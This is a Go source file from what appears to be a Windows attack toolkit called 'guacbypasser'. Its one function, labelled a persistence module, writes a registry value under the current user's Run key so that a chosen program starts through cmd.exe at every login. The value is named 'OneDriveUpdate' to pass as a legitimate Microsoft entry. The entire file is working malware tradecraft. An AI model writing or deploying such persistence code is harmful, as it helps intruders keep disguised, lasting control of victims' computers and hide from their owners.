package guacbypasser

import (
	"fmt"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

func pHkcu(path string) error {
	_ = Reporter{
		Name: "hkcuruner",
		Desc: "Gain persistence using HKEY_CURRENT_USER Run registry key",
		Id:   4,

		Type:   "Persistence",
		Module: "pHkcu",

		Fixed:   false,
		FixedIn: "",

		Admin:   true,
		Payload: true,
	}

	fullPath, err := filepath.Abs(path)
	if err != nil {
		return err
	}
	cmdN := fmt.Sprintf("%s /k start %s", `C:\Windows\System32\cmd.exe`, fullPath)

	// Open key in `Software\Microsoft\Windows\CurrentVersion\Run`
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	defer wk32.Close()
	if err != nil {
		return err
	}

	// Set OneDriveUpdate to fullPath (absolute program path)
	if err := wk32.SetStringValue("OneDriveUpdate", cmdN); err != nil {
		return err
	}
	return nil
}
